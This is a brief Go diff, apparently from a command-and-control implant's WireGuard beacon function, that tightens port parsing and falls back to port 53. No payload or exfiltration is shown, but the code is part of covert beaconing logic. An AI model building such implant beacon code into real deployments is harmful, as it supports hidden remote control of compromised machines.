@@ -235,9 +235,11 @@ func wgBeacon(uri *url.URL) *Beacon {
 	// {{if .Config.Debug}}
 	log.Printf("Establishing Beacon -> %s", uri.String())
 	// {{end}}
-	lport, err := strconv.Atoi(uri.Port())
-	if err != nil {
+	parsedPort, err := strconv.ParseUint(uri.Port(), 10, 16)
+	if err != nil || parsedPort > 65535 {
 		lport = 53
+	} else {
+		lport = uint16(parsedPort)
 	}
 
 	var conn net.Conn
